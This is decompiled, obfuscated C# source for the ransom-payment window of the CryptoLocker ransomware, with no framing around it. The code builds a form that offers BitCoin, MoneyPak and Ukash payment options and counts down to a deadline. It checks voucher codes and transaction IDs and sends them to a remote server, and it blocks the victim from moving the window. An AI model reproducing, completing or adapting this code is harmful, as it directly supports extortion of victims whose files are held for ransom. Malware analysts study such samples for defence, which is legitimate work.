			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.linkLabel_2);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.pictureBox_2);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_3), this.label_23);
			Delegate44.smethod_0(this.panel_3, Delegate11.smethod_0(10, 70));
			Delegate45.smethod_0(this.panel_3, "panel4");
			Delegate46.smethod_0(this.panel_3, Delegate12.smethod_0(408, 354));
			Delegate53.smethod_0(this.panel_3, 34);
			Delegate49.smethod_0(this.label_32, true);
			Delegate50.smethod_0(this.label_32, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_32, Delegate51.smethod_4());
			Delegate44.smethod_0(this.label_32, Delegate11.smethod_0(8, 235));
			Delegate45.smethod_0(this.label_32, "label33");
			Delegate46.smethod_0(this.label_32, Delegate12.smethod_0(372, 15));
			Delegate53.smethod_0(this.label_32, 20);
			Delegate54.smethod_0(this.label_32, "You need to buy 2 vouchers value of 200 each and click <<PAY>>.");
			Delegate68.smethod_0(this.comboBox_3, ComboBoxStyle.DropDownList);
			Delegate50.smethod_0(this.comboBox_3, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate69.smethod_0(this.comboBox_3, true);
			Delegate71.smethod_0(Delegate70.smethod_0(this.comboBox_3), new object[]
			{
				"AF",
				"AX",
				"AL",
				"DZ",
				"AS",
				"AD",
				"AO",
				"AI",
				"AQ",
				"AG",
				"AR",
				"AM",
				"AW",
				"AU",
				"AT",
				"AZ",
				"BS",
				"BH",
				"BD",
				"BB",
				"BY",
				"BE",
				"BZ",
				"BJ",
				"BM",
				"BT",
				"BO",
				"BA",
				"BW",
				"BV",
				"BR",
				"IO",
				"BN",
				"BG",
				"BF",
				"BI",
				"KH",
				"CM",
				"CA",
				"CV",
				"KY",
				"CF",
				"TD",
				"CL",
				"CN",
				"CX",
				"CC",
				"CO",
				"KM",
				"CG",
				"CD",
				"CK",
				"CR",
				"CI",
				"HR",
				"CU",
				"CY",
				"CZ",
				"DK",
				"DJ",
				"DM",
				"DO",
				"EC",
				"EG",
				"SV",
				"GQ",
				"ER",
				"EE",
				"ET",
				"FK",
				"FO",
				"FJ",
				"FI",
				"FR",
				"GF",
				"PF",
				"TF",
				"GA",
				"GM",
				"GE",
				"DE",
				"GH",
				"GI",
				"GR",
				"GL",
				"GD",
				"GP",
				"GU",
				"GT",
				"GG",
				"GN",
				"GW",
				"GY",
				"HT",
				"HM",
				"VA",
				"HN",
				"HK",
				"HU",
				"IS",
				"IN",
				"ID",
				"IR",
				"IQ",
				"IE",
				"IM",
				"IL",
				"IT",
				"JM",
				"JP",
				"JE",
				"JO",
				"KZ",
				"KE",
				"KI",
				"KP",
				"KR",
				"KW",
				"KG",
				"LA",
				"LV",
				"LB",
				"LS",
				"LR",
				"LY",
				"LI",
				"LT",
				"LU",
				"MO",
				"MK",
				"MG",
				"MW",
				"MY",
				"MV",
				"ML",
				"MT",
				"MH",
				"MQ",
				"MR",
				"MU",
				"YT",
				"MX",
				"FM",
				"MD",
				"MC",
				"MN",
				"ME",
				"MS",
				"MA",
				"MZ",
				"MM",
				"NA",
				"NR",
				"NP",
				"NL",
				"AN",
				"NC",
				"NZ",
				"NI",
				"NE",
				"NG",
				"NU",
				"NF",
				"MP",
				"NO",
				"OM",
				"PK",
				"PW",
				"PS",
				"PA",
				"PG",
				"PY",
				"PE",
				"PH",
				"PN",
				"PL",
				"PT",
				"PR",
				"QA",
				"RE",
				"RO",
				"RU",
				"RW",
				"SH",
				"KN",
				"LC",
				"PM",
				"VC",
				"WS",
				"SM",
				"ST",
				"SA",
				"SN",
				"RS",
				"SC",
				"SL",
				"SG",
				"SK",
				"SI",
				"SB",
				"SO",
				"ZA",
				"GS",
				"ES",
				"LK",
				"SD",
				"SR",
				"SJ",
				"SZ",
				"SE",
				"CH",
				"SY",
				"TW",
				"TJ",
				"TZ",
				"TH",
				"TL",
				"TG",
				"TK",
				"TO",
				"TT",
				"TN",
				"TR",
				"TM",
				"TC",
				"TV",
				"UG",
				"UA",
				"AE",
				"GB",
				"US",
				"UM",
				"UY",
				"UZ",
				"VU",
				"VE",
				"VN",
				"VG",
				"VI",
				"WF",
				"EH",
				"YE",
				"ZM",
				"ZW"
			});
			Delegate44.smethod_0(this.comboBox_3, Delegate11.smethod_0(291, 324));
			Delegate45.smethod_0(this.comboBox_3, "comboBox5");
			Delegate46.smethod_0(this.comboBox_3, Delegate12.smethod_0(47, 24));
			Delegate53.smethod_0(this.comboBox_3, 19);
			Delegate49.smethod_0(this.label_29, true);
			Delegate50.smethod_0(this.label_29, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_29, Delegate11.smethod_0(12, 333));
			Delegate45.smethod_0(this.label_29, "label30");
			Delegate46.smethod_0(this.label_29, Delegate12.smethod_0(273, 15));
			Delegate53.smethod_0(this.label_29, 18);
			Delegate54.smethod_0(this.label_29, "Please choose country where UKASH is bought: ");
			Delegate68.smethod_0(this.comboBox_2, ComboBoxStyle.DropDownList);
			Delegate50.smethod_0(this.comboBox_2, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate69.smethod_0(this.comboBox_2, true);
			Delegate71.smethod_0(Delegate70.smethod_0(this.comboBox_2), new object[]
			{
				"EUR",
				"GBP",
				"USD"
			});
			Delegate44.smethod_0(this.comboBox_2, Delegate11.smethod_0(47, 295));
			Delegate45.smethod_0(this.comboBox_2, "comboBox4");
			Delegate46.smethod_0(this.comboBox_2, Delegate12.smethod_0(47, 24));
			Delegate53.smethod_0(this.comboBox_2, 17);
			Delegate49.smethod_0(this.label_28, true);
			Delegate50.smethod_0(this.label_28, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_28, Delegate11.smethod_0(12, 298));
			Delegate45.smethod_0(this.label_28, "label29");
			Delegate46.smethod_0(this.label_28, Delegate12.smethod_0(29, 16));
			Delegate53.smethod_0(this.label_28, 16);
			Delegate54.smethod_0(this.label_28, "200");
			Delegate44.smethod_0(this.textBox_2, Delegate11.smethod_0(111, 299));
			Delegate63.smethod_0(this.textBox_2, 19);
			Delegate45.smethod_0(this.textBox_2, "textBox3");
			Delegate46.smethod_0(this.textBox_2, Delegate12.smethod_0(207, 20));
			Delegate53.smethod_0(this.textBox_2, 15);
			Delegate68.smethod_0(this.comboBox_1, ComboBoxStyle.DropDownList);
			Delegate50.smethod_0(this.comboBox_1, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate69.smethod_0(this.comboBox_1, true);
			Delegate71.smethod_0(Delegate70.smethod_0(this.comboBox_1), new object[]
			{
				"EUR",
				"GBP",
				"USD"
			});
			Delegate44.smethod_0(this.comboBox_1, Delegate11.smethod_0(47, 258));
			Delegate45.smethod_0(this.comboBox_1, "comboBox3");
			Delegate46.smethod_0(this.comboBox_1, Delegate12.smethod_0(47, 24));
			Delegate53.smethod_0(this.comboBox_1, 14);
			Delegate49.smethod_0(this.label_27, true);
			Delegate50.smethod_0(this.label_27, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_27, Delegate11.smethod_0(12, 261));
			Delegate45.smethod_0(this.label_27, "label28");
			Delegate46.smethod_0(this.label_27, Delegate12.smethod_0(29, 16));
			Delegate53.smethod_0(this.label_27, 13);
			Delegate54.smethod_0(this.label_27, "200");
			Delegate44.smethod_0(this.textBox_1, Delegate11.smethod_0(111, 262));
			Delegate63.smethod_0(this.textBox_1, 19);
			Delegate45.smethod_0(this.textBox_1, "textBox2");
			Delegate46.smethod_0(this.textBox_1, Delegate12.smethod_0(207, 20));
			Delegate53.smethod_0(this.textBox_1, 12);
			Delegate64.smethod_0(this.linkLabel_2, Delegate51.smethod_3());
			Delegate49.smethod_0(this.linkLabel_2, true);
			Delegate50.smethod_0(this.linkLabel_2, Delegate13.smethod_0("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate64.smethod_1(this.linkLabel_2, Delegate51.smethod_3());
			Delegate44.smethod_0(this.linkLabel_2, Delegate11.smethod_0(11, 211));
			Delegate45.smethod_0(this.linkLabel_2, "linkLabel3");
			Delegate46.smethod_0(this.linkLabel_2, Delegate12.smethod_0(72, 15));
			Delegate53.smethod_0(this.linkLabel_2, 2);
			Delegate65.smethod_0(this.linkLabel_2, true);
			Delegate54.smethod_0(this.linkLabel_2, "Home Page");
			Delegate66.smethod_0(this.linkLabel_2, new LinkLabelLinkClickedEventHandler(this.method_14));
			Delegate42.smethod_1(this.pictureBox_2, (Image)Delegate43.smethod_0(object_, "pictureBox3.Image"));
			Delegate44.smethod_0(this.pictureBox_2, Delegate11.smethod_0(114, 3));
			Delegate45.smethod_0(this.pictureBox_2, "pictureBox3");
			Delegate46.smethod_0(this.pictureBox_2, Delegate12.smethod_0(176, 92));
			Delegate47.smethod_0(this.pictureBox_2, 1);
			Delegate48.smethod_0(this.pictureBox_2, false);
			Delegate49.smethod_0(this.label_23, true);
			Delegate50.smethod_0(this.label_23, Delegate13.smethod_0("Arial", 9f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_23, Delegate11.smethod_0(8, 98));
			Delegate45.smethod_0(this.label_23, "label22");
			Delegate46.smethod_0(this.label_23, Delegate12.smethod_0(399, 105));
			Delegate53.smethod_0(this.label_23, 0);
			Delegate54.smethod_0(this.label_23, Delegate67.smethod_0(object_, "label22.Text"));
			Delegate68.smethod_0(this.comboBox_0, ComboBoxStyle.DropDownList);
			Delegate50.smethod_0(this.comboBox_0, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate69.smethod_0(this.comboBox_0, true);
			Delegate71.smethod_0(Delegate70.smethod_0(this.comboBox_0), new object[]
			{
				"BitCoin (most cheap option)",
				"MoneyPak (USA only)",
				"Ukash"
			});
			Delegate44.smethod_0(this.comboBox_0, Delegate11.smethod_0(10, 28));
			Delegate45.smethod_0(this.comboBox_0, "comboBox1");
			Delegate46.smethod_0(this.comboBox_0, Delegate12.smethod_0(408, 24));
			Delegate53.smethod_0(this.comboBox_0, 1);
			Delegate72.smethod_0(this.comboBox_0, new EventHandler(this.method_8));
			Delegate49.smethod_0(this.label_14, true);
			Delegate50.smethod_0(this.label_14, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_14, Delegate11.smethod_0(7, 9));
			Delegate45.smethod_0(this.label_14, "label4");
			Delegate46.smethod_0(this.label_14, Delegate12.smethod_0(279, 14));
			Delegate53.smethod_0(this.label_14, 0);
			Delegate54.smethod_0(this.label_14, "Choose a convenient payment method and click Next >>:");
			Delegate49.smethod_0(this.label_15, true);
			Delegate50.smethod_0(this.label_15, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_15, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_15, Delegate11.smethod_0(84, 400));
			Delegate45.smethod_0(this.label_15, "label26");
			Delegate46.smethod_0(this.label_15, Delegate12.smethod_0(29, 24));
			Delegate53.smethod_0(this.label_15, 33);
			Delegate54.smethod_0(this.label_15, "d.");
			Delegate49.smethod_0(this.label_16, true);
			Delegate50.smethod_0(this.label_16, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_16, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_16, Delegate11.smethod_0(54, 400));
			Delegate45.smethod_0(this.label_16, "label25");
			Delegate46.smethod_0(this.label_16, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_16, 32);
			Delegate54.smethod_0(this.label_16, "00");
			Delegate52.smethod_1(this.button_2, Delegate51.smethod_2());
			Delegate56.smethod_0(Delegate55.smethod_0(this.button_2), 0);
			Delegate57.smethod_0(this.button_2, FlatStyle.Flat);
			Delegate50.smethod_0(this.button_2, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.button_2, Delegate51.smethod_0());
			Delegate44.smethod_0(this.button_2, Delegate11.smethod_0(420, 520));
			Delegate45.smethod_0(this.button_2, "button2");
			Delegate46.smethod_0(this.button_2, Delegate12.smethod_0(140, 39));
			Delegate53.smethod_0(this.button_2, 34);
			Delegate54.smethod_0(this.button_2, "<< Back");
			Delegate58.smethod_0(this.button_2, false);
			Delegate59.smethod_0(this.button_2, new EventHandler(this.method_15));
			Delegate73.smethod_0(this, Delegate14.smethod_0(6f, 13f));
			Delegate74.smethod_0(this, AutoScaleMode.Font);
			Delegate52.smethod_1(this, Delegate51.smethod_4());
			Delegate75.smethod_0(this, Delegate12.smethod_0(721, 573));
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.button_2);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_15);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_16);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.panel_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_12);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_11);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_10);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_9);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_8);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.button_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_7);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_6);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_5);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_4);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_3);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_2);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_1);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.pictureBox_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_13);
			Delegate77.smethod_0(this, Delegate76.smethod_0());
			Delegate78.smethod_0(this, FormBorderStyle.Fixed3D);
			Delegate79.smethod_0(this, (Icon)Delegate43.smethod_0(object_, "$this.Icon"));
			Delegate80.smethod_0(this, false);
			Delegate80.smethod_1(this, false);
			Delegate45.smethod_1(this, "Form2");
			Delegate80.smethod_2(this, false);
			Delegate81.smethod_0(this, FormStartPosition.CenterScreen);
			Delegate54.smethod_0(this, "CryptoLocker");
			Delegate82.smethod_0(this, new EventHandler(this.method_1));
			((ISupportInitialize)this.pictureBox_0).EndInit();
			Delegate83.smethod_0(this.panel_0, false);
			Delegate41.smethod_2(this.panel_0);
			Delegate83.smethod_0(this.panel_1, false);
			Delegate41.smethod_2(this.panel_1);
			((ISupportInitialize)this.pictureBox_1).EndInit();
			Delegate83.smethod_0(this.panel_2, false);
			Delegate41.smethod_2(this.panel_2);
			((ISupportInitialize)this.pictureBox_3).EndInit();
			Delegate83.smethod_0(this.panel_3, false);
			Delegate41.smethod_2(this.panel_3);
			((ISupportInitialize)this.pictureBox_2).EndInit();
			Delegate83.smethod_1(this, false);
			Delegate41.smethod_3(this);
		}

		public Form2()
		{
			this.method_0();
		}

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == 274 && m.WParam.ToInt32() == 61456)
			{
				return;
			}
			if (m.Msg == 161 && m.WParam.ToInt32() == 2)
			{
				return;
			}
			Delegate84.smethod_0(this, ref m);
		}

		private void method_1(object sender, EventArgs e)
		{
			this.method_4();
			this.string_0 = Delegate88.smethod_0("http://", this.gclass0_0.method_4(), "/");
			this.gclass0_0.method_15(this.string_0);
			this.gclass0_0.dateTime_0 = Delegate89.smethod_0().AddSeconds((double)this.gclass0_0.int_0);
			Delegate90.smethod_0(this.timer_1, 1000);
			Delegate60.smethod_0(this.timer_1, new EventHandler(this.method_2));
			Delegate91.smethod_0(this.timer_1);
			Delegate54.smethod_0(this.label_1, this.gclass0_0.dateTime_0.ToString());
			Delegate92.smethod_0(this.comboBox_0, 0);
		}

		private void method_2(object sender, EventArgs e)
		{
			this.gclass0_0.int_0--;
			TimeSpan timeSpan = Delegate93.smethod_0((double)this.gclass0_0.int_0);
			if (this.gclass0_0.int_0 < 0)
			{
				Delegate91.smethod_1(this.timer_1);
				return;
			}
			Delegate54.smethod_0(this.label_16, timeSpan.Days.ToString());
			Delegate54.smethod_0(this.label_3, timeSpan.Hours.ToString());
			Delegate54.smethod_0(this.label_5, timeSpan.Minutes.ToString());
			Delegate54.smethod_0(this.label_7, timeSpan.Seconds.ToString());
		}

		private void method_3(object sender, EventArgs e)
		{
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			Form3 object_ = new Form3();
			this.gstruct0_0.int_0 = Delegate94.smethod_0(this.comboBox_0);
			if (Delegate94.smethod_0(this.comboBox_0) == 0)
			{
				if (Delegate96.smethod_0(Delegate95.smethod_0(this.textBox_3)) == 64)
				{
					this.gstruct0_0.string_0 = Delegate95.smethod_0(this.textBox_3);
					flag3 = true;
				}
				else
				{
					Delegate97.smethod_0("Transaction ID must be 64 digits!", "BitCoin", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
			else if (Delegate94.smethod_0(this.comboBox_0) == 1)
			{
				if (Delegate96.smethod_0(Delegate95.smethod_0(this.textBox_0)) >= 12 && Delegate96.smethod_0(Delegate95.smethod_0(this.textBox_0)) <= 16 && this.gclass0_0.method_0(Delegate95.smethod_0(this.textBox_0)))
				{
					this.gstruct0_0.string_1 = Delegate95.smethod_0(this.textBox_0);
					flag = true;
				}
				else
				{
					Delegate97.smethod_0("Voucher code must be between 12 and 16 digits!", "MoneyPak", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
			else if (Delegate94.smethod_0(this.comboBox_0) == 2)
			{
				if (Delegate96.smethod_0(Delegate95.smethod_0(this.textBox_1)) == 19 && Delegate96.smethod_0(Delegate95.smethod_0(this.textBox_2)) == 19 && Delegate98.smethod_0(Delegate95.smethod_0(this.comboBox_3), ""))
				{
					this.gstruct0_0.string_4 = Delegate95.smethod_0(this.comboBox_1);
					this.gstruct0_0.string_5 = Delegate95.smethod_0(this.comboBox_2);
					this.gstruct0_0.string_6 = Delegate95.smethod_0(this.comboBox_3);
					this.gstruct0_0.string_2 = Delegate95.smethod_0(this.textBox_1);
					this.gstruct0_0.string_3 = Delegate95.smethod_0(this.textBox_2);
					flag2 = true;
				}
				else
				{
					Delegate97.smethod_0("Voucher code must be 19 digits and country must be selected!", "Ukash", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
			if (flag || flag2 || flag3)
			{
				Delegate83.smethod_2(this.button_0, false);
				Delegate83.smethod_2(this.button_2, false);
				this.gclass0_0.method_14(this.string_0, this.gstruct0_0);
				Delegate41.smethod_4(object_);
				Delegate41.smethod_5(this);
			}
		}

		private void method_4()
		{
			Delegate41.smethod_6(this.panel_1);
			Delegate41.smethod_6(this.panel_2);
			Delegate41.smethod_6(this.panel_3);
		}

		private void method_5()
		{
			Delegate41.smethod_6(this.panel_2);
			Delegate83.smethod_3(this.panel_2, false);
			Delegate41.smethod_6(this.panel_3);
			Delegate83.smethod_3(this.panel_3, false);
			Delegate41.smethod_4(this.panel_1);
			Delegate41.smethod_7(this.panel_1);
			Delegate54.smethod_0(this.label_21, this.gclass0_0.string_4);
		}

		private void method_6()
		{
			Delegate41.smethod_6(this.panel_1);
			Delegate83.smethod_3(this.panel_1, false);
			Delegate41.smethod_6(this.panel_3);
			Delegate83.smethod_3(this.panel_3, false);
			Delegate41.smethod_4(this.panel_2);
			Delegate41.smethod_7(this.panel_2);
		}

		private void method_7()
		{
			Delegate41.smethod_6(this.panel_1);
			Delegate83.smethod_3(this.panel_1, false);
			Delegate41.smethod_6(this.panel_2);
			Delegate83.smethod_3(this.panel_2, false);
			Delegate41.smethod_4(this.panel_3);
			Delegate41.smethod_7(this.panel_3);
		}

		private void method_8(object sender, EventArgs e)
		{
			if (Delegate94.smethod_0(this.comboBox_0) == 0)
			{
				this.method_5();
				return;
			}
			if (Delegate94.smethod_0(this.comboBox_0) == 1)
			{
				this.method_6();
				return;
			}
			if (Delegate94.smethod_0(this.comboBox_0) == 2)
			{
				this.method_7();
			}
		}

		private void method_9(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class5.smethod_0<string>(1705821916u, 4224541172982820627uL));
		}

		private void method_10(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class3.smethod_1<string>(1514915614u, 7018154679435015681uL));
		}

		private void method_11(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class5.smethod_0<string>(1310153709u, 5120477224569871279uL));
		}

		private void method_12(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class5.smethod_1<string>(322103241u, 1153719192156787883uL));
		}

		private void method_13(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class3.smethod_0<string>(140380773u, 3385757913059859284uL));
		}

		private void method_14(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Delegate99.smethod_0(Class5.smethod_2<string>(1400339294u, 4455922259156251055uL));
		}

		private void method_15(object sender, EventArgs e)
		{
			Delegate83.smethod_2(this.button_0, false);
			Delegate83.smethod_2(this.button_2, false);
			Form1 object_ = new Form1();
			Delegate41.smethod_4(object_);
			Delegate41.smethod_5(this);
		}

		private void method_16(object sender, EventArgs e)
		{
			Delegate100.smethod_0(Delegate95.smethod_0(this.label_21));
		}
	}
}
